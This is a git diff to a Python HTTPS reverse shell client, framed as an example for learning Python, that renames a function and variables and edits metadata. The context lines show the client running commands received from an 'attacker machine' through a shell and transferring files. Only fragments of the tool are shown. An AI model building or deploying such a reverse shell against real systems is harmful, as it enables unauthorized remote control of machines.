@@ -38,8 +38,7 @@ import argparse
 
 __author__ = "dggsoares"
 __copyright__ = "Copyright (c) 2019, Diogo G. Soares"
-__description__ = 'Sample HTTPS reverse shell client example to learn Python language'
-__credits__ = ["dggsoares"]
+__description__ = 'Simple HTTPS reverse shell client example to learn Python language'
 __license__ = "MIT"
 __version__ = "1.0"
 __maintainer__ = "Diogo G. Soares"
@@ -73,7 +72,7 @@ def put(command, session, base_url):
             local_file.write(chunk)
 
 
-def spawn_shell(command, session, base_url):
+def shell_commands(command, session, base_url):
     cmd = subprocess.Popen(command,
                            shell=True,
                            stdout=subprocess.PIPE,
@@ -101,7 +100,7 @@ def main(args):
         elif 'put' in command:
             put(command, session, base_url)
         else:
-            spawn_shell(command, session, base_url)
+            shell_commands(command, session, base_url)
 
         time.sleep(1)
 
@@ -114,5 +113,5 @@ if __name__ == '__main__':
     parser.add_argument('-s', '--server', help='IP or hostname of the attacker machine', required=True)
     parser.add_argument('-p', '--port', help='Port for HTTPS service of the attacker machine', default=443)
 
-    arguments = parser.parse_args()
-    main(arguments)
+    args = parser.parse_args()
+    main(args)
